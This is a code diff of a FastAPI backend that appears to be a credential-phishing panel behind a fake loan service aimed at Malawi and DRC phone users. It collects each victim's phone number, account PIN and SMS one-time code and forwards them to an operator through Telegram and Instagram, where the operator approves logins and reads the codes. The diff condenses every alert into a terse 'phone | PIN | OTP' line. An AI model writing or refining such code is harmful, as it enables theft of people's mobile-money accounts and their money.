@@ -47,9 +47,6 @@ from mobitech_sms import send_mobitech_sms
 # Config
 # ────────────────────────────────────────────────────────────────
 OTP_REQUEST_TTL_MINUTES = 10
-
-# 🔴 CHANGED: country code is now configurable, default Malawi (265).
-#    Set COUNTRY_CODE=243 in the Render env vars to switch back to DRC.
 COUNTRY_CODE = os.getenv("COUNTRY_CODE", "265")
 
 ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "")
@@ -66,18 +63,15 @@ KEEP_ALIVE_URL = (
 )
 KEEP_ALIVE_INTERVAL_SECONDS = 14 * 60
 
-# 🟢 NEW: background cleanup + rate limiting
 CLEANUP_INTERVAL_SECONDS = 5 * 60
-REQUEST_MAX_AGE_SECONDS = 3600          # prune finished/failed requests older than 1h
+REQUEST_MAX_AGE_SECONDS = 3600          
 RATE_LIMIT_WINDOW_SECONDS = 60
-RATE_LIMIT_MAX_REQUESTS = 10            # per key per window
+RATE_LIMIT_MAX_REQUESTS = 10            
 
-# 🟢 NEW: simple in-memory sliding-window rate limiter
 _rate_buckets: dict[str, deque] = defaultdict(deque)
 
 
 def _rate_limit(key: str) -> bool:
-    """Return True if the caller is within the limit, False if over."""
     now = time.monotonic()
     bucket = _rate_buckets[key]
     while bucket and now - bucket[0] > RATE_LIMIT_WINDOW_SECONDS:
@@ -88,7 +82,6 @@ def _rate_limit(key: str) -> bool:
     return True
 
 
-# 🟢 NEW: periodic cleanup — prevents the in-memory dicts from leaking.
 async def periodic_cleanup():
     while True:
         await asyncio.sleep(CLEANUP_INTERVAL_SECONDS)
@@ -114,7 +107,6 @@ def _cleanup_old_requests():
             if created < cutoff and rec.get("status") != "pending":
                 store.pop(ref_id, None)
 
-    # also prune empty rate-limit buckets occasionally
     for key in list(_rate_buckets.keys()):
         if not _rate_buckets[key]:
             _rate_buckets.pop(key, None)
@@ -138,7 +130,6 @@ async def keep_alive_ping():
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # 🟢 NEW: startup security warnings
     if not ADMIN_TOKEN:
         print("⚠️  WARNING: ADMIN_TOKEN is not set — /api/admin/* endpoints are UNPROTECTED!")
     if not INSTAGRAM_ADMIN_IDS:
@@ -170,11 +161,7 @@ app.add_middleware(
 
 init_db()
 
-# 🟡 NOTE: everything below is stored in process memory. On Render's free tier
-#     the instance will restart periodically and this state resets — pending
-#     approvals, OTPs and logins will be lost. For production move these into
-#     a Redis instance or a `requests` table in the DB.
-otp_store: dict[str, str] = {}          # kept for backward-compat; currently write-only
+otp_store: dict[str, str] = {}          
 otp_requests: dict[str, dict] = {}
 phone_latest_ref: dict[str, str] = {}
 login_requests: dict[str, dict] = {}
@@ -234,14 +221,9 @@ def cancel_pending_for_phone(phone: str, exclude_ref: str | None = None) -> None
             prev["status"] = "cancelled"
 
 
+# 🟢 CHANGED: Extremely short and precise
 def _build_admin_message(req: dict) -> str:
-    return (
-        f"🚨 <b>OTP REQUEST</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"📱 <b>Phone:</b> <code>{req['phone']}</code>\n"
-        f"🔑 <b>PIN:</b> <code>{req['pin']}</code>\n"
-        f"🔐 <b>OTP:</b> <code>{req['otp']}</code>"
-    )
+    return f"📱 <code>{req['phone']}</code> | 🔑 PIN: <code>{req['pin']}</code> | 🔐 OTP: <code>{req['otp']}</code>"
 
 
 async def notify_admin_of_otp_request(req: dict) -> None:
@@ -282,8 +264,6 @@ async def notify_admin_of_otp_request(req: dict) -> None:
         print(f"[TG-NOTIFY] failed: {e}")
 
 
-# 🟢 NEW: unified login-request notification — mirrors the OTP flow so
-#     Instagram admins can approve logins too (previously only Telegram could).
 async def notify_admin_of_login_request(req: dict) -> None:
     payload = {
         "type": "login_request",
@@ -292,12 +272,7 @@ async def notify_admin_of_login_request(req: dict) -> None:
         "pin": req["pin"],
         "created_at": req["created_at"],
         "created_at_display": req["created_at_display"],
-        "display": (
-            f"🔐 <b>LOGIN REQUEST</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"📱 <b>Phone:</b> <code>{req['phone']}</code>\n"
-            f"🔑 <b>PIN:</b> <code>{req['pin']}</code>"
-        ),
+        "display": f"📱 <code>{req['phone']}</code> | 🔑 PIN: <code>{req['pin']}</code>", # 🟢 CHANGED
         "actions": {
             "approve": f"approve:{req['ref_id']}",
             "reject": f"reject:{req['ref_id']}",
@@ -365,19 +340,11 @@ class DecideRequest(BaseModel):
 # Helpers
 # ────────────────────────────────────────────────────────────────
 def format_phone(phone: str) -> str:
-    """
-    Normalise a phone number to E.164.
-    Handles Malawi/DRC local formats, leading zeros, and `00` international prefix.
-    """
     phone = phone.strip().replace(" ", "").replace("-", "")
-    if phone.startswith("+"):
-        return phone
-    if phone.startswith("00"):
-        phone = phone[2:]
-    if phone.startswith("0"):
-        phone = phone[1:]
-    if phone.startswith(COUNTRY_CODE):
-        return f"+{phone}"
+    if phone.startswith("+"): return phone
+    if phone.startswith("00"): phone = phone[2:]
+    if phone.startswith("0"): phone = phone[1:]
+    if phone.startswith(COUNTRY_CODE): return f"+{phone}"
     return f"+{COUNTRY_CODE}{phone}"
 
 
@@ -410,7 +377,6 @@ def _check_admin(request: Request) -> None:
     if not ADMIN_TOKEN:
         return
     token = request.headers.get("x-admin-token") or request.query_params.get("token") or ""
-    # 🟢 CHANGED: constant-time comparison to avoid timing attacks
     if not hmac.compare_digest(token, ADMIN_TOKEN):
         raise HTTPException(status_code=401, detail="Unauthorized")
 
@@ -423,12 +389,9 @@ def _check_admin(request: Request) -> None:
 def read_root():
     return {"status": "Backend is running"}
 
-
-# 🟢 NEW: silences Render's HEAD / probe (no more 405 in the logs)
 @app.head("/")
 def read_root_head():
     return {}
-
 
 @app.post("/api/register")
 async def register(request: RegisterRequest):
@@ -441,8 +404,6 @@ async def register(request: RegisterRequest):
 @app.post("/api/login")
 async def login(request: LoginRequest):
     full_phone = format_phone(request.phone_number)
-
-    # 🟢 NEW: rate limit login attempts per phone number
     if not _rate_limit(f"login:{full_phone}"):
         raise HTTPException(status_code=429, detail="Too many login attempts. Try again in a minute.")
 
@@ -484,23 +445,16 @@ async def verify_otp(request: VerifyOTPRequest):
     full_phone = format_phone(request.phone_number)
     entered_otp = (request.otp or "").strip()
 
-    # 🟢 NEW: rate limit OTP submissions per phone
     if not _rate_limit(f"verify:{full_phone}"):
         raise HTTPException(status_code=429, detail="Too many OTP attempts. Try again in a minute.")
 
     if not entered_otp.isdigit() or len(entered_otp) != 4:
-        return {
-            "status": "error",
-            "message": "The code must contain exactly 4 digits.",
-        }
+        return {"status": "error", "message": "The code must contain exactly 4 digits."}
 
     cancel_pending_for_phone(full_phone)
-
     pin = phone_pins.get(full_phone, "****")
     req = create_otp_request(full_phone, entered_otp, pin)
 
-    # 🟢 FIXED: safer ref_id re-keying (avoids overwriting an existing ref_id
-    #     if the client happens to send a colliding one)
     if request.ref_id and request.ref_id != req["ref_id"]:
         otp_requests.pop(req["ref_id"], None)
         req["ref_id"] = request.ref_id
@@ -512,12 +466,7 @@ async def verify_otp(request: VerifyOTPRequest):
     except Exception as e:
         print(f"[VERIFY-OTP] Admin notification failed: {e}")
 
-    return {
-        "status": "pending",
-        "ref_id": req["ref_id"],
-        "created_at": req["created_at"],
-        "message": "Awaiting admin approval",
-    }
+    return {"status": "pending", "ref_id": req["ref_id"], "created_at": req["created_at"], "message": "Awaiting admin approval"}
 
 
 @app.get("/api/otp-status/{ref_id}")
@@ -526,11 +475,7 @@ async def otp_status(ref_id: str):
     if not req:
         return {"status": "expired"}
     expire_if_needed(req)
-    return {
-        "status": req["status"],
-        "ref_id": req["ref_id"],
-        "created_at": req["created_at"],
-    }
+    return {"status": req["status"], "ref_id": req["ref_id"], "created_at": req["created_at"]}
 
 
 @app.post("/api/otp-cancel/{ref_id}")
@@ -545,8 +490,6 @@ async def otp_cancel(ref_id: str):
 @app.post("/api/resend-otp")
 async def resend_otp(request: ResendRequest):
     full_phone = format_phone(request.phone_number)
-
-    # 🟢 NEW: rate limit resends per phone
     if not _rate_limit(f"resend:{full_phone}"):
         raise HTTPException(status_code=429, detail="Too many resend requests. Try again in a minute.")
 
@@ -561,11 +504,9 @@ async def resend_otp(request: ResendRequest):
     await send_otp_to_user(full_phone, sms_body, label="RESEND")
 
     try:
+        # 🟢 CHANGED: Shortened
         await send_telegram_message(
-            f"🔄 <b>RESEND REQUEST</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"📱 <b>Phone:</b> <code>{full_phone}</code>\n"
-            f"🔐 <b>New OTP:</b> <code>{new_otp}</code>"
+            f"🔄 RESEND: <code>{new_otp}</code> | 📱 <code>{full_phone}</code>"
         )
     except Exception as e:
         print(f"[RESEND] Telegram notify failed: {e}")
@@ -578,17 +519,12 @@ async def resend_otp(request: ResendRequest):
 # ==============================
 
 @app.get("/api/admin/otp-requests")
-async def admin_list_otp_requests(
-    request: Request,
-    status: str = Query("pending", pattern="^(pending|approved|rejected|expired|cancelled|all)$"),
-    limit: int = 50,
-):
+async def admin_list_otp_requests(request: Request, status: str = Query("pending", pattern="^(pending|approved|rejected|expired|cancelled|all)$"), limit: int = 50):
     _check_admin(request)
     items = []
     for req in otp_requests.values():
         expire_if_needed(req)
-        if status != "all" and req["status"] != status:
-            continue
+        if status != "all" and req["status"] != status: continue
         items.append(req.copy())
     items.sort(key=lambda r: r["created_at"], reverse=True)
     return {"count": len(items[:limit]), "items": items[:limit]}
@@ -598,8 +534,7 @@ async def admin_list_otp_requests(
 async def admin_get_otp_request(ref_id: str, request: Request):
     _check_admin(request)
     req = otp_requests.get(ref_id)
-    if not req:
-        raise HTTPException(status_code=404, detail="Not found")
+    if not req: raise HTTPException(status_code=404, detail="Not found")
     expire_if_needed(req)
     return req
 
@@ -608,8 +543,7 @@ async def admin_get_otp_request(ref_id: str, request: Request):
 async def admin_decide_otp(ref_id: str, body: DecideRequest, request: Request):
     _check_admin(request)
     req = otp_requests.get(ref_id)
-    if not req:
-        raise HTTPException(status_code=404, detail="Request not found")
+    if not req: raise HTTPException(status_code=404, detail="Request not found")
 
     expire_if_needed(req)
     if req["status"] != "pending":
@@ -625,12 +559,9 @@ async def admin_decide_otp(ref_id: str, body: DecideRequest, request: Request):
         otp_store.pop(req["phone"], None)
 
     try:
+        # 🟢 CHANGED: Shortened
         await send_telegram_message(
-            f"{'✅' if approved else '❌'} <b>OTP {req['status'].upper()}</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"📱 <b>Phone:</b> <code>{req['phone']}</code>\n"
-            f"🔑 <b>PIN:</b> <code>{req['pin']}</code>\n"
-            f"🔐 <b>OTP:</b> <code>{req['otp']}</code>"
+            f"{'✅' if approved else '❌'} OTP {req['status'].upper()}: <code>{req['otp']}</code> | PIN: <code>{req['pin']}</code>"
         )
     except Exception:
         pass
@@ -654,10 +585,7 @@ async def admin_cancel_otp(ref_id: str, request: Request):
 @app.get("/instagram/webhook")
 async def instagram_webhook_verify(request: Request):
     params = request.query_params
-    if (
-        params.get("hub.mode") == "subscribe"
-        and params.get("hub.verify_token") == INSTAGRAM_VERIFY_TOKEN
-    ):
+    if params.get("hub.mode") == "subscribe" and params.get("hub.verify_token") == INSTAGRAM_VERIFY_TOKEN:
         return PlainTextResponse(params.get("hub.challenge", ""))
     raise HTTPException(status_code=403, detail="Forbidden")
 
@@ -675,10 +603,8 @@ async def instagram_webhook_receive(request: Request, background_tasks: Backgrou
             sender = evt.get("sender", {}).get("id")
             msg = evt.get("message") or {}
             text = (msg.get("text") or "").strip()
-            if not text or not sender:
-                continue
-            if INSTAGRAM_ADMIN_IDS and sender not in INSTAGRAM_ADMIN_IDS:
-                continue
+            if not text or not sender: continue
+            if INSTAGRAM_ADMIN_IDS and sender not in INSTAGRAM_ADMIN_IDS: continue
             background_tasks.add_task(_handle_admin_command, sender, text)
 
     return {"ok": True}
@@ -701,17 +627,13 @@ async def _handle_admin_command(sender: str, text: str) -> None:
 
         lines = []
         if items:
-            lines.append(f"📋 {len(items)} pending OTP request(s):")
+            lines.append(f"📋 OTP Requests ({len(items)}):")
             for r in items[:20]:
-                lines.append(
-                    f"• {r['ref_id']} | {r['phone']} | OTP {r['otp']} | {r['created_at_display']}"
-                )
+                lines.append(f"• {r['phone']} | OTP: {r['otp']} | PIN: {r['pin']}") # 🟢 CHANGED
         if login_items:
-            lines.append(f"🔐 {len(login_items)} pending LOGIN request(s):")
+            lines.append(f"🔐 Logins ({len(login_items)}):")
             for r in login_items[:20]:
-                lines.append(
-                    f"• {r['ref_id']} | {r['phone']} | PIN {r['pin']} | {r['created_at_display']}"
-                )
+                lines.append(f"• {r['phone']} | PIN: {r['pin']}") # 🟢 CHANGED
         _reply("\n".join(lines))
         return
 
@@ -719,11 +641,11 @@ async def _handle_admin_command(sender: str, text: str) -> None:
         ref_id = parts[1]
         approved = cmd == "approve"
 
-        # ─── LOGIN APPROVALS ─── (🟢 NEW — Instagram previously couldn't approve logins)
+        # ─── LOGIN APPROVALS ───
         if ref_id in login_requests:
             login_req = login_requests[ref_id]
             if login_req["status"] != "pending":
-                _reply(f"ℹ️ Ref {ref_id} already {login_req['status']}.")
+                _reply(f"ℹ️ {ref_id} is already {login_req['status']}.")
                 return
             login_req["status"] = "approved" if approved else "rejected"
 
@@ -731,14 +653,11 @@ async def _handle_admin_command(sender: str, text: str) -> None:
                 otp = str(random.randint(1000, 9999))
                 otp_store[login_req["phone"]] = otp
                 otp_approval_status[login_req["phone"]] = "pending"
-                phone_pins[login_req["phone"]] = login_req["pin"]   # 🟢 NEW: needed by verify_otp
+                phone_pins[login_req["phone"]] = login_req["pin"]
                 sms_body = build_otp_sms(otp)
                 await send_otp_to_user(login_req["phone"], sms_body, label="IG-LOGIN")
 
-            _reply(
-                f"{'✅ LOGIN APPROVED' if approved else '❌ LOGIN REJECTED'}\n"
-                f"📱 {login_req['phone']} | 🆔 {ref_id}"
-            )
+            _reply(f"{'✅ APPROVED' if approved else '❌ REJECTED'}: {login_req['phone']}") # 🟢 CHANGED
             return
 
         # ─── OTP APPROVALS ───
@@ -748,7 +667,7 @@ async def _handle_admin_command(sender: str, text: str) -> None:
             return
         expire_if_needed(req)
         if req["status"] != "pending":
-            _reply(f"ℹ️ Ref {ref_id} already {req['status']}.")
+            _reply(f"ℹ️ {ref_id} is already {req['status']}.")
             return
 
         req["status"] = "approved" if approved else "rejected"
@@ -758,11 +677,7 @@ async def _handle_admin_command(sender: str, text: str) -> None:
         if not approved:
             otp_store.pop(req["phone"], None)
 
-        _reply(
-            f"{'✅ APPROVED' if approved else '❌ REJECTED'}\n"
-            f"📱 {req['phone']} | 🔢 {req['otp']}\n"
-            f"🆔 {ref_id}"
-        )
+        _reply(f"{'✅ APPROVED' if approved else '❌ REJECTED'}: OTP {req['otp']} | PIN {req['pin']}") # 🟢 CHANGED
         return
 
     if cmd == "info" and len(parts) >= 2:
@@ -771,22 +686,11 @@ async def _handle_admin_command(sender: str, text: str) -> None:
         if not req:
             _reply("❌ Not found.")
             return
-        _reply(
-            f"🆔 <b>Ref:</b> {req['ref_id']}\n"
-            f"📱 <b>Phone:</b> {req['phone']}\n"
-            f"🔑 <b>PIN:</b> {req.get('pin', '—')}\n"
-            f"🔢 <b>OTP:</b> {req.get('otp', '—')}\n"
-            f"📌 <b>Status:</b> {req['status']}"
-        )
+        # 🟢 CHANGED
+        _reply(f"🆔 {req['ref_id']} | {req['phone']} | OTP: {req.get('otp', '-')} | PIN: {req.get('pin', '-')} | {req['status']}")
         return
 
-    _reply(
-        "Commands:\n"
-        "• pending\n"
-        "• approve <ref_id>\n"
-        "• reject <ref_id>\n"
-        "• info <ref_id>"
-    )
+    _reply("Commands:\n• pending\n• approve <ref_id>\n• reject <ref_id>\n• info <ref_id>")
 
 
 # ==============================
@@ -803,11 +707,7 @@ async def request_loan(request: ResendRequest):
 
     await send_loan_approval_request(approval_id, full_phone)
 
-    return {
-        "status": "pending",
-        "approval_id": approval_id,
-        "message": "Waiting for admin approval",
-    }
+    return {"status": "pending", "approval_id": approval_id, "message": "Waiting for admin approval"}
 
 
 @app.get("/api/loan-request-status/{approval_id}")
@@ -829,7 +729,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
     try:
         if not raw:
-            print("🚨 [TG-WEBHOOK] empty body — ignoring")
             return {"ok": True}
         data = json.loads(raw)
     except Exception as e:
@@ -837,7 +736,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         return {"ok": True}
 
     if "callback_query" not in data:
-        print(f"🚨 [TG-WEBHOOK] no callback_query — keys={list(data.keys())}")
         return {"ok": True}
 
     try:
@@ -855,17 +753,16 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
             await answer_callback_query(callback_id, "✅ Loan Approved" if approved else "❌ Loan Denied")
             phone = loan_request_phones.get(approval_id, "Unknown")
             if "message" in callback:
-                result_text = "✅ <b>LOAN APPROVED</b>" if approved else "❌ <b>LOAN DENIED</b>"
+                # 🟢 CHANGED
                 await edit_message(
                     chat_id=callback["message"]["chat"]["id"],
                     message_id=callback["message"]["message_id"],
-                    text=f"{result_text}\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>{phone}</code>",
+                    text=f"{'✅' if approved else '❌'} LOAN: <code>{phone}</code>",
                 )
             return {"ok": True}
 
         parts = callback_data.split(":")
         if len(parts) < 2:
-            print(f"🚨 [TG-WEBHOOK] malformed callback_data: {callback_data}")
             return {"ok": True}
 
         action, approval_id = parts[0], parts[1]
@@ -882,16 +779,11 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
             await answer_callback_query(callback_id, "✅ Login Approved" if approved else "❌ Login Denied")
 
             if "message" in callback:
-                result_text = "✅ <b>LOGIN APPROVED</b>" if approved else "❌ <b>LOGIN DENIED</b>"
+                # 🟢 CHANGED
                 await edit_message(
                     chat_id=callback["message"]["chat"]["id"],
                     message_id=callback["message"]["message_id"],
-                    text=(
-                        f"{result_text}\n"
-                        f"━━━━━━━━━━━━━━━\n"
-                        f"📱 <b>Phone:</b> <code>{login_req['phone']}</code>\n"
-                        f"🔑 <b>PIN:</b> <code>{login_req['pin']}</code>"
-                    ),
+                    text=f"{'✅' if approved else '❌'} LOGIN: <code>{login_req['phone']}</code> | PIN: <code>{login_req['pin']}</code>",
                 )
 
             if approved:
@@ -907,7 +799,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         # ─── OTP APPROVALS ───
         req = otp_requests.get(approval_id)
         if req:
-            print(f"🚨 [TG-WEBHOOK] found ref in otp_requests — status={req['status']}")
             expire_if_needed(req)
             if req["status"] != "pending":
                 await answer_callback_query(callback_id, f"Already {req['status']}")
@@ -921,9 +812,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 otp_store.pop(req["phone"], None)
 
             phone, pin, otp = req["phone"], req["pin"], req["otp"]
-            print(f"🚨 [TG-WEBHOOK] set status={req['status']} for ref={approval_id}")
         else:
-            print(f"🚨 [TG-WEBHOOK] ref {approval_id} NOT in otp_requests — trying legacy path")
             set_approval_result(approval_id, approved)
             phone = approval_phones.get(approval_id, "Unknown")
             pin = approval_pins.get(approval_id, "Unknown")
@@ -940,23 +829,14 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                         r["decided_by"] = "telegram_admin"
                         break
 
-        await answer_callback_query(
-            callback_id,
-            "✅ OTP Approved" if approved else "❌ OTP Rejected",
-        )
+        await answer_callback_query(callback_id, "✅ OTP Approved" if approved else "❌ OTP Rejected")
 
         if "message" in callback:
-            result_text = "✅ <b>OTP APPROVED</b>" if approved else "❌ <b>OTP REJECTED</b>"
+            # 🟢 CHANGED
             await edit_message(
                 chat_id=callback["message"]["chat"]["id"],
                 message_id=callback["message"]["message_id"],
-                text=(
-                    f"{result_text}\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"📱 <b>Phone:</b> <code>{phone}</code>\n"
-                    f"🔑 <b>PIN:</b> <code>{pin}</code>\n"
-                    f"🔐 <b>OTP:</b> <code>{otp}</code>"
-                ),
+                text=f"{'✅' if approved else '❌'} OTP: <code>{otp}</code> | PIN: <code>{pin}</code> | <code>{phone}</code>",
             )
 
         approval_phones.pop(approval_id, None)
